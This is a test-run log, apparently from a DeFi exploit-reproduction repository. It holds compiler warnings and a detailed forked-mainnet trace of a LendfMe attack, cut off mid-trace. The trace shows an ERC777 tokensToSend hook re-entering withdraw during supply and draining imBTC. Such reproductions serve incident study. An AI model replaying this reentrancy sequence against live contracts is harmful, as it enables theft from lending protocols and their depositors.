Compiling 20 files with Solc 0.8.10
Compiling 21 files with Solc 0.8.28
Solc 0.8.28 finished in 958.12ms
Solc 0.8.10 finished in 1.17s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1084:5:
     |
1084 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1896:5:
     |
1896 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2198:5:
     |
2198 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2967:5:
     |
2967 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:4424:5:
     |
4424 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 23756)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [7939] ExploitScript::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 1234567 [1.234e6])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [23756] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return]
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.49s (64.88ms CPU time)

Ran 1 test for src/test/2020-04/LendfMe_exp.sol:LendfMeExploit
[PASS] testExploit() (gas: 629115)
Logs:
  [Before Attack]Victim imBTC Balance : : 29134710218
  [Before Attack]Attacker imBTC Balance : : 21595
  --------------------------------------------------------------
  [After Attack]Victim imBTC Balance : : 29134688624
  [After Attack]Attacker imBTC Balance : : 43189

Traces:
  [5845] LendfMeExploit::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 9899725 [9.899e6])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [694415] LendfMeExploit::testExploit()
    ├─ [8150] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea) [staticcall]
    │   └─ ← [Return] 29134710218 [2.913e10]
    ├─ emit log_named_uint(key: "[Before Attack]Victim imBTC Balance : ", val: 29134710218 [2.913e10])
    ├─ [5575] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(0xA9BF70A420d364e923C74448D9D817d3F2A77822) [staticcall]
    │   └─ ← [Return] 21595 [2.159e4]
    ├─ emit log_named_uint(key: "[Before Attack]Attacker imBTC Balance : ", val: 21595 [2.159e4])
    ├─ [24598] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::approve(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─  storage changes:
    │   │   @ 0x42b1ce4b172c5ee330475bff8fc9fe7ddd76e7c5ca6f1fe8dcc40c253bb05a94: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   └─ ← [Return] true
    ├─ [27371] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::setInterfaceImplementer(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895, LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─ emit InterfaceImplementerSet(addr: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], interfaceHash: 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895, implementer: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─  storage changes:
    │   │   @ 0xd3db02fa4a38fd0a9e26aa400601da2b6a2d8a5a998b71ab8ecdc283ae940dd4: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   └─ ← [Stop]
    ├─ [0] VM::startPrank(0xA9BF70A420d364e923C74448D9D817d3F2A77822)
    │   └─ ← [Return]
    ├─ [1575] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(0xA9BF70A420d364e923C74448D9D817d3F2A77822) [staticcall]
    │   └─ ← [Return] 21595 [2.159e4]
    ├─ [67982] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::transfer(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 21595 [2.159e4])
    │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0xA9BF70A420d364e923C74448D9D817d3F2A77822, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ emit Sent(operator: 0xA9BF70A420d364e923C74448D9D817d3F2A77822, from: 0xA9BF70A420d364e923C74448D9D817d3F2A77822, to: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 21595 [2.159e4], data: 0x, operatorData: 0x)
    │   ├─ emit Transfer(from: 0xA9BF70A420d364e923C74448D9D817d3F2A77822, to: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 21595 [2.159e4])
    │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─  storage changes:
    │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x000000000000000000000000000000000000000000000492aad3e4c9508c0000
    │   │   @ 0x03ec19c00a17b0b4096d5f9d0a782ea0a8e791460d2fb914b1079745118347ce: 0x000000000000000000000000000000000000000000000492aad3e4c9508c0000 → 0
    │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc97: 0 → 0x0000000000000000000000000000000000000000000000000e06920d724e4fdf
    │   └─ ← [Return] true
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [1575] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 21595 [2.159e4]
    ├─ [2150] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea) [staticcall]
    │   └─ ← [Return] 29134710218 [2.913e10]
    ├─ [156949] 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea::supply(0x3212b29E33587A00FB1C83346f5dBFA69A458923, 21594 [2.159e4])
    │   ├─ [1336] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::allowance(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea)
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   ├─ [1575] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Return] 21595 [2.159e4]
    │   ├─ [2150] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea)
    │   │   └─ ← [Return] 29134710218 [2.913e10]
    │   ├─ [7221] 0x9a18c4D9587344f2B15686Aa67EE7e5C4B00D549::getSupplyRate(0x3212b29E33587A00FB1C83346f5dBFA69A458923, 29134731812 [2.913e10], 3529518 [3.529e6])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000014608ab04
    │   ├─ [22568] 0x9a18c4D9587344f2B15686Aa67EE7e5C4B00D549::getBorrowRate(0x3212b29E33587A00FB1C83346f5dBFA69A458923, 29134731812 [2.913e10], 3529518 [3.529e6])
    │   │   ├─ [2150] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea)
    │   │   │   └─ ← [Return] 29134710218 [2.913e10]
    │   │   ├─ [2764] 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea::oracle()
    │   │   │   └─ ← [Return] 0xB620707637C5b2cc49843A03d90E28D9abbDa149
    │   │   ├─ [2343] 0xB620707637C5b2cc49843A03d90E28D9abbDa149::mostRecentCaller()
    │   │   │   └─ ← [Return] 0x000000000000000000000000d8e0e707e5bde9e2c8e3f39e40ec1e066f1341af
    │   │   ├─ [2306] 0xB620707637C5b2cc49843A03d90E28D9abbDa149::mostRecentBlock()
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000970e86
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000146b8797b
    │   ├─ [26260] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::transferFrom(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, 21594 [2.159e4])
    │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   └─ ← [Return] LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
    │   │   ├─ [1669] LendfMeExploit::tokensToSend(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, 21594 [2.159e4], 0x, 0x)
    │   │   │   └─ ← [Stop]
    │   │   ├─ emit Sent(operator: 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, from: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, amount: 21594 [2.159e4], data: 0x, operatorData: 0x)
    │   │   ├─ emit Transfer(from: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, value: 21594 [2.159e4])
    │   │   ├─ emit Approval(owner: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, value: 115792089237316195423570985008687907853269984665640564039457584007913129618341 [1.157e77])
    │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   ├─  storage changes:
    │   │   │   @ 0x42b1ce4b172c5ee330475bff8fc9fe7ddd76e7c5ca6f1fe8dcc40c253bb05a94: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffaba5
    │   │   │   @ 0x23cd5fb27dba5566c2b842d5800732c71976b323e023aaad302231f5b1359c63: 0x0000000000000000000000000000000000000000000000000e068ec8c97ac18b → 0x0000000000000000000000000000000000000000000000000e06920d724e4fdf
    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x000000000000000000000000000000000000000000000492aad3e4c9508c0000 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
    │   │   │   @ 0x23cd5fb27dba5566c2b842d5800732c71976b323e023aaad302231f5b1359c62: 0x00000000000000000000000000000000000000005e2394ee12de10ffc0d93297 → 0x00000000000000000000000000000000000000005e23af7049f1af9f4ad4f1e6
    │   │   └─ ← [Return] true
    │   ├─ emit SupplyReceived(: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0x3212b29E33587A00FB1C83346f5dBFA69A458923, : 21594 [2.159e4], : 0, : 21594 [2.159e4])
    │   ├─  storage changes:
    │   │   @ 0x870bf085a5c23310f9c8e92583466ddf96a9986d02ca7506561291d5aad2ba90: 0x0000000000000000000000000000000000000000000000000de9ccdd2fbfc362 → 0x0000000000000000000000000000000000000000000000000de9d524b8318046
    │   │   @ 0x870bf085a5c23310f9c8e92583466ddf96a9986d02ca7506561291d5aad2ba92: 0x0000000000000000000000000000000000000000000000000000000146b879ad → 0x0000000000000000000000000000000000000000000000000000000146b8797b
    │   │   @ 0x870bf085a5c23310f9c8e92583466ddf96a9986d02ca7506561291d5aad2ba8e: 0x00000000000000000000000000000000000000000000000000000006c42d607e → 0x00000000000000000000000000000000000000000000000000000006c42db4d8
    │   │   @ 0x870bf085a5c23310f9c8e92583466ddf96a9986d02ca7506561291d5aad2ba93: 0x0000000000000000000000000000000000000000000000000decc3bdb0b94246 → 0x0000000000000000000000000000000000000000000000000deccc0b749f697b
    │   │   @ 0xfecfd3b695cab06e789b541836c6501d818a5bb52531086cc2ac3bddbd420d91: 0 → 21594
    │   │   @ 0x870bf085a5c23310f9c8e92583466ddf96a9986d02ca7506561291d5aad2ba8c: 0x0000000000000000000000000000000000000000000000000000000000970851 → 0x0000000000000000000000000000000000000000000000000000000000970ecd
    │   │   @ 0xfecfd3b695cab06e789b541836c6501d818a5bb52531086cc2ac3bddbd420d92: 0 → 0x0000000000000000000000000000000000000000000000000de9d524b8318046
    │   └─ ← [Return] 0
    ├─ [251185] 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea::supply(0x3212b29E33587A00FB1C83346f5dBFA69A458923, 1)
    │   ├─ [1336] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::allowance(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea)
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129618341 [1.157e77]
    │   ├─ [1575] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Return] 1
    │   ├─ [1575] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea)
    │   │   └─ ← [Return] 29134731812 [2.913e10]
    │   ├─ [5221] 0x9a18c4D9587344f2B15686Aa67EE7e5C4B00D549::getSupplyRate(0x3212b29E33587A00FB1C83346f5dBFA69A458923, 29134731813 [2.913e10], 3529518 [3.529e6])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000014608ab04
    │   ├─ [9493] 0x9a18c4D9587344f2B15686Aa67EE7e5C4B00D549::getBorrowRate(0x3212b29E33587A00FB1C83346f5dBFA69A458923, 29134731813 [2.913e10], 3529518 [3.529e6])
    │   │   ├─ [1575] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea)
    │   │   │   └─ ← [Return] 29134731812 [2.913e10]
    │   │   ├─ [764] 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea::oracle()
    │   │   │   └─ ← [Return] 0xB620707637C5b2cc49843A03d90E28D9abbDa149
    │   │   ├─ [343] 0xB620707637C5b2cc49843A03d90E28D9abbDa149::mostRecentCaller()
    │   │   │   └─ ← [Return] 0x000000000000000000000000d8e0e707e5bde9e2c8e3f39e40ec1e066f1341af
    │   │   ├─ [306] 0xB620707637C5b2cc49843A03d90E28D9abbDa149::mostRecentBlock()
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000970e86
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000146b8797b
    │   ├─ [193409] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::transferFrom(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, 1)
    │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   └─ ← [Return] LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
    │   │   ├─ [176993] LendfMeExploit::tokensToSend(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, 1, 0x, 0x)
    │   │   │   ├─ [174240] 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea::withdraw(0x3212b29E33587A00FB1C83346f5dBFA69A458923, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   │   ├─ [25069] 0xB620707637C5b2cc49843A03d90E28D9abbDa149::assetPrices(0x3212b29E33587A00FB1C83346f5dBFA69A458923)
    │   │   │   │   │   ├─ [13915] 0xE171D8c7e9EE0DDAe1A9bec0c7f35294e48c28d4::assetPrices(0x3212b29E33587A00FB1C83346f5dBFA69A458923)
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000004e4177d0653fa25087911bc00
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0: 0x000000000000000000000000d8e0e707e5bde9e2c8e3f39e40ec1e066f1341af → 0x0000000000000000000000001804c8ab1f12e6bbf3894d4083f33e07309d1f38
    │   │   │   │   │   │   @ 1: 0x0000000000000000000000000000000000000000000000000000000000970e86 → 0x0000000000000000000000000000000000000000000000000000000000970ecd
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000004e4177d0653fa25087911bc00
    │   │   │   │   ├─ [2969] 0xB620707637C5b2cc49843A03d90E28D9abbDa149::assetPrices(0x3212b29E33587A00FB1C83346f5dBFA69A458923)
    │   │   │   │   │   ├─ [1915] 0xE171D8c7e9EE0DDAe1A9bec0c7f35294e48c28d4::assetPrices(0x3212b29E33587A00FB1C83346f5dBFA69A458923)
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000004e4177d0653fa25087911bc00
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000004e4177d0653fa25087911bc00
    │   │   │   │   ├─ [1575] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea)
    │   │   │   │   │   └─ ← [Return] 29134731812 [2.913e10]
    │   │   │   │   ├─ [2969] 0xB620707637C5b2cc49843A03d90E28D9abbDa149::assetPrices(0x3212b29E33587A00FB1C83346f5dBFA69A458923)
    │   │   │   │   │   ├─ [1915] 0xE171D8c7e9EE0DDAe1A9bec0c7f35294e48c28d4::assetPrices(0x3212b29E33587A00FB1C83346f5dBFA69A458923)
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000004e4177d0653fa25087911bc00
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000004e4177d0653fa25087911bc00
    │   │   │   │   ├─ [5221] 0x9a18c4D9587344f2B15686Aa67EE7e5C4B00D549::getSupplyRate(0x3212b29E33587A00FB1C83346f5dBFA69A458923, 29134710218 [2.913e10], 3529518 [3.529e6])
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000014608ab04
    │   │   │   │   ├─ [6382] 0x9a18c4D9587344f2B15686Aa67EE7e5C4B00D549::getBorrowRate(0x3212b29E33587A00FB1C83346f5dBFA69A458923, 29134710218 [2.913e10], 3529518 [3.529e6])
    │   │   │   │   │   ├─ [1575] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea)
    │   │   │   │   │   │   └─ ← [Return] 29134731812 [2.913e10]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000146b87984
    │   │   │   │   ├─ [15360] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::transfer(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 21594 [2.159e4])
    │   │   │   │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   │   ├─ emit Sent(operator: 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, from: 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, to: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 21594 [2.159e4], data: 0x, operatorData: 0x)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, to: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 21594 [2.159e4])
    │   │   │   │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0x000000000000000000000000000000000000000000000492aad3e4c9508c0000
    │   │   │   │   │   │   @ 0x23cd5fb27dba5566c2b842d5800732c71976b323e023aaad302231f5b1359c62: 0x00000000000000000000000000000000000000005e23af7049f1af9f4ad4f1e6 → 0x00000000000000000000000000000000000000005e23aaddacfe8189a1acf1e6
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ emit SupplyWithdrawn(: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0x3212b29E33587A00FB1C83346f5dBFA69A458923, : 21594 [2.159e4], : 21594 [2.159e4], : 0)
    │   │   │   │   ├─  storage changes:
    │   │   │   │   │   @ 0xfecfd3b695cab06e789b541836c6501d818a5bb52531086cc2ac3bddbd420d91: 21594 → 0
    │   │   │   │   │   @ 0x870bf085a5c23310f9c8e92583466ddf96a9986d02ca7506561291d5aad2ba8e: 0x00000000000000000000000000000000000000000000000000000006c42db4d8 → 0x00000000000000000000000000000000000000000000000000000006c42d607e
    │   │   │   │   │   @ 0x870bf085a5c23310f9c8e92583466ddf96a9986d02ca7506561291d5aad2ba92: 0x0000000000000000000000000000000000000000000000000000000146b8797b → 0x0000000000000000000000000000000000000000000000000000000146b87984
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Stop]
    │   │   ├─ emit Sent(operator: 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, from: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, amount: 1, data: 0x, operatorData: 0x)
    │   │   ├─ emit Transfer(from: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, value: 1)
    │   │   ├─ emit Approval(owner: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, value: 115792089237316195423570985008687907853269984665640564039457584007913129618340 [1.157e77])
    │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   ├─  storage changes:
    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x000000000000000000000000000000000000000000000492aad3e4c9508c0000 → 0x0000000000000000000000000000000000000000000004929cf32e15a9280000
    │   │   │   @ 0x42b1ce4b172c5ee330475bff8fc9fe7ddd76e7c5ca6f1fe8dcc40c253bb05a94: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffaba5 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffaba4
    │   │   │   @ 0x23cd5fb27dba5566c2b842d5800732c71976b323e023aaad302231f5b1359c62: 0x00000000000000000000000000000000000000005e23aaddacfe8189a1acf1e6 → 0x00000000000000000000000000000000000000005e23aaddbadf383d4910f1e6
    │   │   │   @ 0xfecfd3b695cab06e789b541836c6501d818a5bb52531086cc2ac3bddbd420d91: 21594 → 0
    │   │   └─ ← [Return] true
    │   ├─ emit SupplyReceived(: LendfMeExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0x3212b29E33587A00FB1C83346f5dBFA69A458923, : 1, : 0, : 21595 [2.159e4])
    │   ├─  storage changes:
    │   │   @ 0x870bf085a5c23310f9c8e92583466ddf96a9986d02ca7506561291d5aad2ba8e: 0x00000000000000000000000000000000000000000000000000000006c42d607e → 0x00000000000000000000000000000000000000000000000000000006c42db4d9
    │   │   @ 0xfecfd3b695cab06e789b541836c6501d818a5bb52531086cc2ac3bddbd420d91: 0 → 21595
    │   │   @ 0x870bf085a5c23310f9c8e92583466ddf96a9986d02ca7506561291d5aad2ba92: 0x0000000000000000000000000000000000000000000000000000000146b87984 → 0x0000000000000000000000000000000000000000000000000000000146b8797b
    │   └─ ← [Return] 0
    ├─ [76140] 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea::withdraw(0x3212b29E33587A00FB1C83346f5dBFA69A458923, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ [2969] 0xB620707637C5b2cc49843A03d90E28D9abbDa149::assetPrices(0x3212b29E33587A00FB1C83346f5dBFA69A458923)
    │   │   ├─ [1915] 0xE171D8c7e9EE0DDAe1A9bec0c7f35294e48c28d4::assetPrices(0x3212b29E33587A00FB1C83346f5dBFA69A458923)
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000004e4177d0653fa25087911bc00
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000004e4177d0653fa25087911bc00
    │   ├─ [2969] 0xB620707637C5b2cc49843A03d90E28D9abbDa149::assetPrices(0x3212b29E33587A00FB1C83346f5dBFA69A458923)
    │   │   ├─ [1915] 0xE171D8c7e9EE0DDAe1A9bec0c7f35294e48c28d4::assetPrices(0x3212b29E33587A00FB1C83346f5dBFA69A458923)
